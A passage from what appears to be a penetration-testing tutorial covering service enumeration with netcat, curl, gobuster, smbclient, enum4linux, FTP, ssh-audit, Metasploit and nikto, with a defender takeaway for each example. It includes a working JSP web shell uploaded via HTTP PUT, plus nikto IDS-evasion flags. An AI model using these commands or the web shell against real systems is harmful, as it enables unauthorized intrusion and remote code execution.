# => SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u7   # => exact SSH version confirmed
# => (connection closes after banner if you don't proceed with key exchange)

# SMTP banner grab (if port 25 were open)
nc 192.0.2.5 25
# => 220 mail.target-corp.com ESMTP Postfix (Debian/GNU)   # => SMTP server + domain
EHLO attacker.com
# => 250-mail.target-corp.com                # => server hostname confirmed
# => 250-PIPELINING
# => 250-SIZE 10240000
# => 250-VRFY                                # => VRFY enabled — allows user enumeration!
# => 250-STARTTLS
# => 250 HELP
```

**Key Takeaway:** Anonymous FTP login with a readable directory listing is a direct data exfiltration path requiring zero credentials — any file in the FTP root is immediately accessible. SMTP VRFY enabled allows enumerating valid user accounts. Defenders should disable anonymous FTP access, suppress version banners (`ServerTokens Prod` for Apache; `Banner none` for SSH), and disable SMTP VRFY.

**Why It Matters:** Netcat banner grabbing gives red teamers ground truth that automated scanners sometimes get wrong. When nmap returns `tcpwrapped` or misidentifies a service, netcat lets you interact directly with the protocol to confirm what is actually running. It requires no special tooling — available on every Unix system — making it the universal fallback for service interaction during engagements.

---

## Example 13: Web Server Enumeration — curl -I Headers Reveal Server/Version Info

**What this covers:** The HTTP response headers sent by a web server contain metadata that reveals the server software, version, backend language, framework, cookies, and security policy headers. `curl -I` sends an HTTP HEAD request and prints only the response headers, enabling rapid reconnaissance of the web layer without downloading page content.

**Scenario:** Port 80 on `192.0.2.5` hosts a web application. Enumerate the HTTP response headers to identify the technology stack and assess the security posture of the HTTP layer.

```bash
# Basic HEAD request — retrieve headers only
curl -I http://192.0.2.5/

# => HTTP/1.1 200 OK
# => Date: Wed, 21 May 2026 03:00:00 GMT
# => Server: Apache/2.4.25 (Debian)         # => server type + version — remove in production
# => X-Powered-By: PHP/7.4.3                # => PHP version — remove with expose_php = Off
# => Set-Cookie: PHPSESSID=abc123def456; path=/   # => PHP session — no HttpOnly/Secure flags
# => Content-Type: text/html; charset=UTF-8
# => Connection: keep-alive

# Security header audit — check for missing defensive headers
curl -I http://192.0.2.5/ | grep -i "strict\|content-security\|x-frame\|x-content\|referrer"
# => (no output)   # => NONE of the security headers are present — significant finding

# Security headers checklist — each absent header is a finding:
# Strict-Transport-Security   => missing: HTTPS not enforced (HSTS absent)
# Content-Security-Policy     => missing: XSS protection via CSP absent
# X-Frame-Options             => missing: clickjacking possible
# X-Content-Type-Options      => missing: MIME-type sniffing attacks possible
# Referrer-Policy             => missing: referrer data may leak internal paths

# Follow redirects and show all intermediate headers
curl -IL http://192.0.2.5/
# -L   follow redirects (shows redirect chain)
# => HTTP/1.1 301 Moved Permanently               # => HTTP to HTTPS redirect
# => Location: https://192.0.2.5/                # => redirect target
# => HTTP/1.1 200 OK                              # => final response after redirect

# Send to HTTPS and check TLS header behavior
curl -Ik https://192.0.2.5/
# -k   disable certificate verification (useful in lab with self-signed certs)
# => Strict-Transport-Security: max-age=31536000   # => HSTS present on HTTPS — good
# => X-Powered-By: PHP/7.4.3                       # => still leaking PHP version over HTTPS

# Check specific paths for different header sets
curl -I http://192.0.2.5/admin/
# => HTTP/1.1 401 Unauthorized              # => admin path exists, auth required
# => WWW-Authenticate: Basic realm="Admin"  # => HTTP Basic auth — credentials in base64
```

**Key Takeaway:** The absence of every security header combined with explicit server and PHP version disclosure means this web server has both information disclosure and security policy weaknesses. HTTP Basic auth on `/admin/` sends credentials in base64 over plaintext HTTP — trivially sniffable. Defenders should configure `ServerTokens Prod`, `ServerSignature Off`, set all security headers, and enforce HTTPS with HSTS.

**Why It Matters:** HTTP header analysis takes seconds and produces findings that appear in every web application penetration test report. Missing security headers are concrete, reportable findings with clear remediation steps. Version disclosure directly enables targeted CVE research (Example 24). Red teamers run header checks against every discovered web endpoint as the first web-layer reconnaissance step.

---

## Example 14: robots.txt and sitemap.xml Recon — What Disallowed Paths Reveal

**What this covers:** `robots.txt` instructs search engine crawlers which URL paths to avoid indexing. Paradoxically, it acts as a roadmap to sensitive areas — administrators list paths they want to hide, which reveals exactly what an attacker should investigate. `sitemap.xml` provides a complete map of the site's intended content structure.

**Scenario:** The web application on `192.0.2.5:80` is your target. Retrieve and analyze `robots.txt` and `sitemap.xml` to identify hidden paths before running directory brute-forcing.

```bash
# Retrieve robots.txt
curl -s http://192.0.2.5/robots.txt

# => User-agent: *
# => Disallow: /admin/              # => admin panel — high-value target
# => Disallow: /backup/             # => backup directory — may contain source or data
# => Disallow: /private/            # => private section — unknown content, must investigate
# => Disallow: /api/v1/internal/    # => internal API — should not be externally accessible
# => Disallow: /uploads/temp/       # => temp upload directory — may contain user-uploaded files
# => Disallow: /wp-admin/           # => WordPress admin — confirms CMS
# => Disallow: /phpmyadmin/         # => phpMyAdmin — database management web UI
# => Allow: /                       # => everything else is allowed

# Each Disallow entry is a high-priority investigation target
# Note: robots.txt provides zero actual security — it's advisory only

# Verify each disallowed path exists and check response codes
for path in /admin/ /backup/ /private/ /api/v1/internal/ /uploads/temp/ /wp-admin/ /phpmyadmin/; do
  echo -n "$path: "
  curl -s -o /dev/null -w "%{http_code}" "http://192.0.2.5$path"
  echo
done
# => /admin/: 401               # => exists, requires authentication
# => /backup/: 200              # => exists and returns content — directory listing?
# => /private/: 403             # => exists but forbidden — try path traversal
# => /api/v1/internal/: 200     # => internal API accessible — critical finding
# => /uploads/temp/: 200        # => temp uploads accessible — check for sensitive files
# => /wp-admin/: 302            # => redirects to wp-login.php — WordPress confirmed
# => /phpmyadmin/: 200          # => phpMyAdmin is accessible — database management exposed

# Retrieve sitemap.xml for complete URL inventory
curl -s http://192.0.2.5/sitemap.xml | grep -o '<loc>[^<]*</loc>' | sed 's/<[^>]*>//g'
# => http://192.0.2.5/
# => http://192.0.2.5/about/
# => http://192.0.2.5/contact/
# => http://192.0.2.5/products/
# => http://192.0.2.5/products/api/   # => API endpoint listed in sitemap — investigate
# => http://192.0.2.5/login/          # => login page — try default credentials

# Check for WordPress-specific sitemaps
curl -s http://192.0.2.5/wp-sitemap.xml | grep '<loc>' | head -20
# => If successful: reveals all WordPress post/page URLs including draft and private post IDs
```

**Key Takeaway:** The `/backup/` path returning HTTP 200 combined with a probable directory listing is an immediate critical finding — backup files often contain database dumps, source code, or configuration files with plaintext credentials. Accessible `/phpmyadmin/` gives GUI access to the database if credentials are weak. Defenders should remove sensitive paths from `robots.txt` (it provides no real protection) and restrict access to admin tools by IP.

**Why It Matters:** Robots.txt analysis takes under 30 seconds and frequently saves hours of directory brute-forcing by listing exactly what the defender considers sensitive. Red teamers always check `robots.txt` before running gobuster because every disallowed path is a manually curated hint about the application's attack surface.

---

## Example 15: Directory Brute-Forcing with gobuster — dir Mode

**What this covers:** Directory brute-forcing sends HTTP requests for paths from a wordlist, identifying directories and files that are not linked from the application but are still accessible. Unlike robots.txt which reveals deliberately hidden paths, brute-forcing discovers forgotten or unintentionally exposed content — backup files, old versions, developer tools, and configuration files.

**Scenario:** You have completed passive recon on `http://192.0.2.5`. Run gobuster in directory mode with a standard wordlist to enumerate all accessible paths on the web server.

```bash
gobuster dir \
  -u http://192.0.2.5 \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,txt,bak,zip,sql \
  -t 40 \
  -o /tmp/gobuster-dir.txt

# dir         directory/file brute-force mode
# -u          target URL
# -w          wordlist path (dirb/common.txt has ~4600 words)
# -x          file extensions to append to each word
# -t 40       40 concurrent threads (adjust for target sensitivity)
# -o          save output to file

# --- Sample output ---
# /.htaccess           (Status: 403) [Size: 274]     # => exists but forbidden — file is there
# /.htpasswd           (Status: 403) [Size: 274]     # => htpasswd present — basic auth configured
# /admin               (Status: 301) [Size: 319]     # => redirects to /admin/
# /admin/              (Status: 401) [Size: 456]     # => auth required — try default creds
# /backup              (Status: 200) [Size: 1234]    # => confirmed from robots.txt — accessible!
# /backup/db.sql       (Status: 200) [Size: 45678]  # => database dump found — critical!
# /config.php.bak      (Status: 200) [Size: 890]    # => backup of config file — check for creds
# /index.php           (Status: 200) [Size: 5678]   # => main page
# /info.php            (Status: 200) [Size: 72341]  # => phpinfo() — full config disclosure
# /login.php           (Status: 200) [Size: 2345]   # => login form
# /phpmyadmin          (Status: 200) [Size: 12345]  # => confirmed phpMyAdmin
# /server-status       (Status: 403) [Size: 274]    # => Apache server-status (restricted)
# /uploads             (Status: 301) [Size: 318]    # => upload directory — check contents
# /uploads/            (Status: 200) [Size: 456]    # => directory listing enabled — enumerate!

# Download the database dump found
curl -s http://192.0.2.5/backup/db.sql -o /tmp/db.sql
head -50 /tmp/db.sql
# => -- MySQL dump 10.13  Distrib 5.7.28
# => -- Host: localhost
# => CREATE TABLE users (id INT, username VARCHAR(50), password VARCHAR(255), ...);
# => INSERT INTO users VALUES (1,'admin','$2y$10$...',...);   # => bcrypt hash — crack offline

# Use a larger wordlist for deeper coverage
gobuster dir \
  -u http://192.0.2.5 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt,bak \
  -t 20 \
  -o /tmp/gobuster-medium.txt
# => directory-list-2.3-medium.txt has ~220,000 words — significantly more thorough
# => Reduce threads (-t 20) to avoid overwhelming the server or triggering rate limiting
```

**Key Takeaway:** The `db.sql` database dump exposes the users table with bcrypt password hashes — offline cracking with hashcat against rockyou.txt may recover admin credentials without ever brute-forcing the login page. `info.php` (phpinfo) discloses the full PHP configuration, installed modules, environment variables, and server paths. Defenders must remove backup files, disable directory listing (`Options -Indexes`), and delete phpinfo pages from production servers.

**Why It Matters:** Directory brute-forcing consistently produces the highest-severity findings in web application assessments. Forgotten backup files and exposed phpinfo pages are endemic in production environments because they are created during development and never cleaned up. Red teamers always run gobuster against every web target before attempting application-level attacks, as finding a database dump eliminates the need for SQL injection entirely.

---

## Example 16: Subdomain Enumeration with gobuster — dns Mode

**What this covers:** Subdomain enumeration discovers additional hostnames under the target domain by sending DNS queries for candidate names from a wordlist. Each discovered subdomain may host a different application with different security posture — staging environments, admin panels, API gateways, and developer tools often live on subdomains with weaker controls than the primary domain.

**Scenario:** You are assessing `target-corp.com`. Run gobuster in DNS mode to enumerate subdomains and expand the attack surface beyond what passive sources revealed.

```bash
gobuster dns \
  -d target-corp.com \
  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -t 50 \
  --resolver 8.8.8.8 \
  -o /tmp/gobuster-dns.txt

# dns         DNS subdomain brute-force mode
# -d          target domain
# -w          subdomain wordlist
# -t 50       50 concurrent threads for DNS queries
# --resolver  use Google DNS (8.8.8.8) for consistent resolution
# -o          save results

# --- Sample output ---
# Found: api.target-corp.com             # => API endpoint — investigate all routes
# Found: dev.target-corp.com             # => development environment — often unpatched
# Found: mail.target-corp.com            # => mail server — confirmed from passive recon
# Found: staging.target-corp.com         # => staging — likely same code, less security
# Found: vpn.target-corp.com             # => VPN gateway — credential attack target
# Found: jira.target-corp.com            # => Jira project management — common default creds
# Found: jenkins.target-corp.com         # => Jenkins CI/CD — script console = RCE
# Found: grafana.target-corp.com         # => Grafana dashboards — CVE-2021-43798 path traversal
# Found: git.target-corp.com             # => internal Git — may contain source code
# Found: wiki.target-corp.com            # => internal wiki — may contain credentials/procedures

# Resolve each found subdomain to its IP address
for sub in api dev mail staging vpn jira jenkins grafana git wiki; do
  echo -n "$sub.target-corp.com: "
  dig +short "$sub.target-corp.com" A
done
# => api.target-corp.com: 203.0.113.60       # => different IP = separate server
# => dev.target-corp.com: 10.x.0.5           # => internal IP leaked via DNS!
# => jenkins.target-corp.com: 203.0.113.70   # => public-facing Jenkins — critical

# Use a comprehensive SecLists wordlist for maximum coverage
gobuster dns \
  -d target-corp.com \
  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  -t 30 \
  -o /tmp/gobuster-dns-full.txt
# => 110,000 subdomain candidates — significantly more thorough
# => Reduce threads to avoid DNS rate limiting
```

**Key Takeaway:** Jenkins on `jenkins.target-corp.com` publicly accessible is a critical finding — unauthenticated Jenkins instances expose a Groovy script console that executes arbitrary code on the CI/CD server, which typically has production deployment credentials. A `dev.target-corp.com` resolving to an internal IP (`10.x.0.5`) leaked through public DNS means the internal host is reachable — if the web app is vulnerable, it is an internal pivot point.

**Why It Matters:** Subdomains are the most consistently overlooked part of an organization's attack surface. Developer tools like Jenkins, Jira, and Grafana are deployed internally and then exposed through DNS without proper hardening. Certificate transparency already exposes many subdomains passively, but wordlist-based DNS enumeration catches development and staging hosts that were never issued a certificate. Red teamers always combine passive cert-transparency results with active DNS brute-forcing.

---

## Example 17: Virtual Host Discovery — gobuster vhost Mode

**What this covers:** Virtual hosting allows a single IP address to serve multiple distinct web applications by routing requests based on the HTTP `Host` header. When multiple sites share an IP, DNS enumeration finds only the subdomains that have DNS records — virtual hosts with no DNS entry are invisible to DNS-based enumeration. gobuster vhost mode brute-forces Host headers to discover hidden applications sharing an IP.

**Scenario:** The IP `203.0.113.42` hosts `target-corp.com`. Discover any other web applications served from this IP that have no DNS records by brute-forcing the Host header.

```bash
gobuster vhost \
  -u http://203.0.113.42 \
  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain target-corp.com \
  -t 40 \
  -o /tmp/gobuster-vhost.txt

# vhost              virtual host discovery mode
# -u                 base URL (use IP to bypass DNS — sends requests directly to server)
# -w                 wordlist (same DNS wordlist works for vhosts)
# --append-domain    append target-corp.com to each word (word becomes word.target-corp.com)
# -t 40              40 concurrent threads
# -o                 save results

# --- Sample output ---
# Found: internal.target-corp.com (Status: 200, Size: 8923)
# # => internal site with no DNS record — only accessible via Host header manipulation
# # => This is shadow IT that only exists on the server config, not in public DNS

# Found: old.target-corp.com (Status: 200, Size: 34512)
# # => old version of the site — may run outdated software

# Found: beta.target-corp.com (Status: 200, Size: 5671)
# # => beta testing environment — likely less scrutinized, may have debug features

# Found: crm.target-corp.com (Status: 302, Size: 0)
# # => CRM system redirect — follow redirect to identify software (Salesforce? SugarCRM?)

# Verify a found vhost manually with curl using the Host header
curl -H "Host: internal.target-corp.com" http://203.0.113.42/ -I
# -H "Host: ..."  manually set the Host header to the discovered virtual host
# => HTTP/1.1 200 OK
# => Server: Apache/2.4.25 (Debian)
# => X-Powered-By: PHP/7.4.3
# => Set-Cookie: PHPSESSID=xyz; path=/; HttpOnly   # => session cookie set — app is running
# => Content-Type: text/html; charset=UTF-8

# Browse the discovered virtual host with curl
curl -H "Host: internal.target-corp.com" http://203.0.113.42/ -s | grep -i "title\|login\|admin"
# => <title>Target Corp Internal Portal - Employee Dashboard</title>
# => <a href="/admin">Admin Panel</a>   # => admin link discovered directly from the hidden site
```

**Key Takeaway:** An internal employee portal with no DNS record — accessible only via Host header — represents a complete authentication bypass for network perimeter controls: the application assumes it is only reachable internally but the IP is internet-facing. Defenders should place internal-only virtual hosts on separate IPs that are not publicly routable, or require VPN access at the network level.

**Why It Matters:** Virtual host discovery is the gap between DNS-based enumeration and reality. Organizations frequently configure virtual hosts for internal tools, beta releases, and legacy applications without creating DNS records, believing that "no DNS = no access." In practice, any client that can reach the IP can access the virtual host by setting the correct Host header. This technique regularly surfaces employee portals, internal APIs, and administrative tools that bypass all DNS-based access controls.

---

## Example 18: SMB Enumeration — smbclient and enum4linux

**What this covers:** SMB (Server Message Block) is the Windows file-sharing protocol, also implemented on Linux via Samba. It exposes shares, user lists, group memberships, password policies, and system information. Enumeration without credentials is possible when guest access is enabled or null session authentication is allowed — both common misconfigurations.

**Scenario:** nmap revealed SMB on port 445 of `192.0.2.5` with Samba. Enumerate available shares, user accounts, and system information using smbclient and enum4linux.

```bash
# List available shares — attempt null/guest session first
smbclient -L //192.0.2.5 -N

# -L    list shares
# -N    no password (null session — anonymous access)

# --- Sample output ---
# Sharename       Type      Comment
# ---------       ----      -------
# print$          Disk      Printer Drivers     # => standard printer driver share
# IPC$            IPC       IPC Service         # => inter-process communication — always present
# data            Disk      Company Data        # => custom share — investigate!
# backup          Disk      System Backups      # => backup share — potentially sensitive
# Samba server version 4.5.16-Debian
# Workgroup: WORKGROUP    # => not domain-joined — standalone Samba server

# Connect to the data share and list contents
smbclient //192.0.2.5/data -N
# => Try "help" to get a list of possible commands
smb: \> ls
# =>   .                        D        0  Mon Jan 1 00:00:00 2024
# =>   ..                       D        0  Mon Jan 1 00:00:00 2024
# =>   finance/                 D        0  Tue Feb 1 00:00:00 2024   # => finance folder
# =>   HR/                      D        0  Wed Mar 1 00:00:00 2024   # => HR folder
# =>   config.ini               A     2048  Thu Apr 1 00:00:00 2024   # => config file!

smb: \> get config.ini /tmp/config.ini
# => getting file \config.ini of size 2048 as /tmp/config.ini
# => config file retrieved — check for database passwords, API keys

# Comprehensive enumeration with enum4linux
enum4linux -a 192.0.2.5

# -a    run all checks: users, shares, groups, OS info, password policy, printers

# --- enum4linux sample output (key sections) ---
# [*] OS information
# => OS: Windows 6.1 (Samba 4.5.16-Debian)   # => Samba version confirmed

# [*] Users
# => user:[root] rid:[0x3e8]      # => root account — RID 1000
# => user:[admin] rid:[0x3e9]     # => admin account
# => user:[john.smith] rid:[0x3ea]  # => regular user — matches harvester email list
# => user:[jane.doe] rid:[0x3eb]

# [*] Password Policy
# => Minimum password length: 0   # => NO minimum length — trivial passwords allowed
# => Password history length: 0   # => passwords never expire or rotate
# => Account lockout threshold: None  # => unlimited brute-force attempts!

# [*] Groups
# => Group: admin  Members: root, admin     # => admin group members
```

**Key Takeaway:** The backup share accessible via null session combined with no account lockout policy creates two independent attack paths: direct data exfiltration from the share, and unrestricted brute-force against SMB authentication using the user list from enum4linux. Defenders must disable null session access (`restrict anonymous = 2` in smb.conf), enforce password policy via Group Policy or equivalent, and enable account lockout.

**Why It Matters:** SMB enumeration without credentials is one of the highest-yield reconnaissance steps on internal networks. It yields user lists that feed password spraying (Example 27), backup files that may contain credentials, and password policy details that define the optimal brute-force strategy. Red teamers always enumerate SMB before attempting any authenticated access because null session data shapes the entire subsequent attack plan.

---

## Example 19: FTP Anonymous Login Check

**What this covers:** FTP servers configured to allow anonymous login accept any username of `anonymous` and any string as a password, granting file system access without credentials. This misconfiguration is common on internal servers, network appliances, and legacy systems. Anonymous FTP access directly enables data exfiltration and, if write access is granted, arbitrary file upload.

**Scenario:** nmap and banner grabbing suggested vsFTPd on `192.0.2.5`. Verify whether anonymous login is accepted and enumerate all accessible files.

```bash
# Method 1: Standard FTP client
ftp 192.0.2.5

# => Connected to 192.0.2.5.
# => 220 (vsFTPd 3.0.3)
# => Name (192.0.2.5:attacker): anonymous        # => type "anonymous" as username
# => 331 Please specify the password.
# Password:                                       # => type any email string
# => 230 Login successful.                        # => anonymous login accepted — critical!
# ftp>

# List root directory contents
ftp> ls -la
# => 150 Here comes the directory listing.
# => drwxr-xr-x 3 ftp  ftp  4096 Jan 01 00:00 .
# => drwxr-xr-x 3 ftp  ftp  4096 Jan 01 00:00 ..
# => -rw-r--r-- 1 ftp  ftp   890 Feb 01 00:00 welcome.txt
# => drwxr-xr-x 2 ftp  ftp  4096 Mar 01 00:00 pub
# => -rw-r--r-- 1 ftp  ftp  45678 Apr 01 00:00 backup.zip   # => backup file — download it!
# => 226 Directory send OK.

# Download all accessible files
ftp> get backup.zip /tmp/backup.zip
# => local: /tmp/backup.zip remote: backup.zip
# => 226 Transfer complete.

ftp> cd pub
ftp> ls
# => -rw-r--r-- 1 ftp ftp 1234 config.bak      # => another backup in pub directory

ftp> get config.bak /tmp/config.bak
ftp> bye

# Method 2: wget for bulk anonymous FTP download
wget -r --no-passive-ftp ftp://anonymous:anonymous@192.0.2.5/
# -r              recursive download — get all files
# --no-passive-ftp  use active FTP mode (may be needed behind NAT)
# => Downloads entire FTP tree to local ./192.0.2.5/ directory

# Method 3: nmap NSE script for quick anonymous FTP check
nmap --script ftp-anon -p 21 192.0.2.5
# => PORT   STATE SERVICE
# => 21/tcp open  ftp
# => | ftp-anon: Anonymous FTP login allowed (FTP code 230)
# => | -rw-r--r--  1 ftp ftp   890 Jan 1 welcome.txt
# => | drwxr-xr-x  2 ftp ftp  4096 Jan 1 pub/
# => |_-rw-r--r--  1 ftp ftp 45678 Apr 1 backup.zip   # => confirms backup file visible

# Check for write access (dangerous — would allow malware upload)
ftp 192.0.2.5
# ftp> put /tmp/test.txt test-write-check.txt
# => If 226 Transfer Complete: WRITE ACCESS ENABLED — critical severity
# => If 550 Permission denied: read-only anonymous (still a finding, lower severity)
```

**Key Takeaway:** Anonymous FTP with a readable `backup.zip` is a critical finding because backup archives routinely contain database credentials, configuration files, and source code — the entire application secrets in one download. Write access to anonymous FTP is even more severe: it enables uploading a web shell if the FTP directory is also web-accessible. Defenders should disable anonymous FTP entirely (`anonymous_enable=NO` in vsftpd.conf) unless there is an explicit business requirement.

**Why It Matters:** Anonymous FTP is a decades-old misconfiguration that still appears in modern environments because legacy systems, network appliances (printers, routers), and IANA "FTP mirror" defaults leave it enabled. Red teamers check FTP anonymous access in the first five minutes of testing because the ROI — potentially recovering all application secrets without any authentication — is unmatched by more complex attack paths. One `ftp anonymous@` login can make the rest of the engagement trivial.

---

## Example 20: SSH User Enumeration — ssh-audit Output

**What this covers:** ssh-audit analyzes an SSH server's configuration — supported key exchange algorithms, host key types, ciphers, and MAC algorithms — and flags insecure or deprecated options. Beyond configuration auditing, certain older OpenSSH versions (pre-7.7) are vulnerable to CVE-2018-15473, which allows enumerating valid usernames by observing timing differences in authentication failure responses.

**Scenario:** OpenSSH 7.4p1 is running on `192.0.2.5:22`. Use ssh-audit to evaluate the server's cryptographic configuration and check for known vulnerabilities.

```bash
# Run ssh-audit against the target
ssh-audit 192.0.2.5

# --- Sample output ---
# # general
# (gen) banner: SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u7   # => exact version confirmed
# (gen) software: OpenSSH 7.4p1                            # => maps to CVE-2018-15473
# (gen) compatibility: OpenSSH 7.4+, Dropbear SSH 2018.76+
# (gen) compression: enabled (zlib@openssh.com)

# # key exchange algorithms
# (kex) curve25519-sha256                       -- [info] available since OpenSSH 6.5
# (kex) diffie-hellman-group14-sha1             -- [warn] 2048-bit modulus only  # => weak
# (kex) diffie-hellman-group1-sha1              -- [fail] removed in OpenSSH 6.9
#                                               # => group1 = 1024-bit DH — critical weakness

# # host-key algorithms
# (key) ssh-rsa                -- [info] using RSA 2048 bits
# (key) ssh-dss                -- [fail] removed in OpenSSH 7.0
#                              # => DSA/DSS is 1024-bit — weak, should be disabled

# # encryption algorithms (ciphers)
# (enc) aes128-ctr             -- [info] available since OpenSSH 3.7
# (enc) aes192-ctr             -- [info] available since OpenSSH 3.7
# (enc) 3des-cbc               -- [fail] removed in OpenSSH 6.7
#                              # => 3DES CBC mode — vulnerable to SWEET32 (CVE-2016-2183)
# (enc) arcfour                -- [fail] removed in OpenSSH 6.7
#                              # => RC4 stream cipher — cryptographically broken

# # message authentication codes
# (mac) hmac-sha1              -- [warn] using deprecated SHA-1 hash   # => weak
# (mac) hmac-md5               -- [fail] removed in OpenSSH 6.7        # => broken

# # summary
# (crt) CVE-2018-10933         -- [fail] authentication bypass in libssh (not OpenSSH, check libs)
# (crt) CVE-2018-15473         -- [fail] username enumeration via timing
#       Recommendation: update to OpenSSH 7.7 or later to fix username enumeration

# Username enumeration using CVE-2018-15473 (confirmed vulnerable — OpenSSH 7.4)
# Use ssh-username-enum or Metasploit module auxiliary/scanner/ssh/ssh_enumusers
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_enumusers; \
  set RHOSTS 192.0.2.5; \
  set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt; \
  run; exit"
# => [+] 192.0.2.5:22 - SSH - User 'root' found
# => [+] 192.0.2.5:22 - SSH - User 'admin' found
# => [+] 192.0.2.5:22 - SSH - User 'john.smith' found   # => confirms harvester result!
# => [-] 192.0.2.5:22 - SSH - User 'nonexistent' not found
```

**Key Takeaway:** OpenSSH 7.4p1 is vulnerable to CVE-2018-15473 username enumeration, which confirms the user list from SMB enumeration and theHarvester without authentication. The 3DES and RC4 cipher support makes older session recordings decryptable offline. Defenders should upgrade to OpenSSH 8.x or later, disable deprecated ciphers in `/etc/ssh/sshd_config`, and restrict SSH access to known IP ranges.

**Why It Matters:** Username confirmation via SSH timing attacks transforms a probabilistic user list (from OSINT) into a verified target list for credential attacks. Red teamers cross-reference ssh-audit CVE findings with the version string from nmap to confirm exploitability before attempting username enumeration, which itself could trigger IDS alerts. ssh-audit also serves as a hardening compliance check that identifies cryptographic weakness findings for the report.

---

## Example 21: HTTP Method Enumeration — curl OPTIONS/PUT/DELETE

**What this covers:** HTTP servers can be configured to accept methods beyond the standard GET and POST — OPTIONS reveals what methods the server allows, while PUT and DELETE can enable file upload and deletion if misconfigured. Dangerously permissive method configuration on web applications or REST APIs is a common misconfiguration that can lead to arbitrary file upload and remote code execution.

**Scenario:** The web server on `192.0.2.5:80` and the Tomcat instance on `192.0.2.5:8080` both need HTTP method enumeration. Identify all accepted methods and test dangerous ones.

```bash
# OPTIONS request — asks server to list its supported HTTP methods
curl -X OPTIONS http://192.0.2.5/ -I -v 2>&1 | grep -i "allow\|methods"
# -X OPTIONS    send HTTP OPTIONS request
# -I            head-only (no body)
# -v            verbose (show full request/response)

# => Allow: GET, HEAD, POST, OPTIONS    # => web app: only safe methods — good
# => Accept-Ranges: bytes

# Check Tomcat on port 8080
curl -X OPTIONS http://192.0.2.5:8080/ -I -v 2>&1 | grep -i "allow"
# => Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS   # => PUT and DELETE enabled — critical!

# Test PUT — attempt to upload a file
curl -X PUT http://192.0.2.5:8080/test-upload.txt \
  -d "This is a test file" \
  -v 2>&1 | grep "< HTTP"
# => < HTTP/1.1 201 Created     # => file uploaded successfully — critical finding!
# => Attacker can now upload a JSP web shell to /test-shell.jsp
# => Tomcat executes JSP — this is remote code execution

# Upload a JSP web shell via HTTP PUT (lab demonstration only)
curl -X PUT http://192.0.2.5:8080/shell.jsp \
  -d '<%@ page import="java.io.*" %><%
    String cmd = request.getParameter("cmd");
    Process p = Runtime.getRuntime().exec(cmd);
    // => creates OS process — executes system commands
    InputStream in = p.getInputStream();
    // => captures command output
    int a = -1;
    while((a=in.read())!=-1) out.print((char)a);
    // => streams output back to HTTP response
  %>'
# => HTTP/1.1 201 Created   # => web shell uploaded

# Test the uploaded shell
curl "http://192.0.2.5:8080/shell.jsp?cmd=id"
# => uid=1000(tomcat) gid=1000(tomcat) groups=1000(tomcat)   # => code execution confirmed!

# Test DELETE method
curl -X DELETE http://192.0.2.5:8080/test-upload.txt -v 2>&1 | grep "< HTTP"
# => < HTTP/1.1 204 No Content    # => file deleted — destructive capability confirmed
```

**Key Takeaway:** HTTP PUT enabled on Tomcat with a 201 Created response is an immediate remote code execution vulnerability — a JSP web shell uploaded in seconds gives OS-level command execution under the Tomcat service account. Defenders must restrict allowed HTTP methods in the Tomcat `web.xml` to GET, POST, and HEAD only, and consider using a WAF rule to block PUT and DELETE from untrusted sources.

**Why It Matters:** HTTP method misconfigurations on Tomcat and other application servers are among the fastest exploitation paths in a web application assessment — the entire chain from discovery to command execution takes under five minutes. Red teamers check HTTP methods on every discovered web endpoint because the aggressive scan (Example 9) revealed PUT and DELETE enabled on this server, making this a pre-planned verification step rather than exploratory testing.

---

## Example 22: Nikto Web Scan — Output Annotated by Severity

**What this covers:** Nikto is an open-source web server scanner that checks for thousands of known vulnerabilities, dangerous files, version disclosure, and configuration weaknesses in a single run. It produces a prioritized list of findings that complement directory brute-forcing and manual header analysis. Nikto is intentionally noisy — it is not designed for stealth — so use it when thoroughness outweighs detection risk.

**Scenario:** Run nikto against the web server on `192.0.2.5:80` to get a comprehensive automated vulnerability assessment of the HTTP layer.

```bash
nikto -h http://192.0.2.5 -o /tmp/nikto-report.txt -Format txt

# -h          target host and URL
# -o          output file
# -Format txt  text format (also supports htm, xml, csv)

# --- Sample output (annotated by severity) ---

# [CRITICAL] OSVDB-3233: /phpinfo.php: PHP information page found.
# => phpinfo() discloses full PHP configuration, installed extensions,
# => environment variables, and server paths — use this to plan further attacks
# => Severity: CRITICAL — directly enables targeted attack planning

# [CRITICAL] OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals internal info.
# => PHP easter egg URL reveals version — another information disclosure path
# => Severity: HIGH — confirms PHP version

# [HIGH] OSVDB-630: The web server may reveal its internal or real IP in the Location header.
# => Server returned internal IP 10.x.0.5 in a redirect Location header
# => Reveals internal network topology — useful for pivot planning

# [HIGH] OSVDB-3092: /backup/: This might be interesting...
# => Directory listing or backup files accessible
# => Already confirmed from gobuster — this corroborates the finding

# [HIGH] OSVDB-3268: /admin/: Directory indexing found.
# => Admin directory visible but requires auth (401) — try default credentials

# [MEDIUM] OSVDB-3092: /phpmyadmin/: phpMyAdmin directory found.
# => Web-based MySQL management interface — brute-force or default credentials

# [MEDIUM] X-Frame-Options header is not present.
# => Clickjacking vulnerability — page can be embedded in iframe

# [MEDIUM] X-Content-Type-Options header is not present.
# => MIME sniffing attacks possible

# [LOW] Retrieved x-powered-by header: PHP/7.4.3
# => Version disclosure — already noted from curl -I

# [INFO] Server: Apache/2.4.25 (Debian)
# => Version disclosure — already confirmed

# Run against HTTPS with certificate verification disabled
nikto -h https://192.0.2.5 -ssl -o /tmp/nikto-https.txt -Format txt

# Run with increased evasion techniques (evade basic IDS signatures)
nikto -h http://192.0.2.5 -evasion 1,2,3
# -evasion 1  random URI encoding
# -evasion 2  directory self-reference (/./)
# -evasion 3  premature URL ending
```

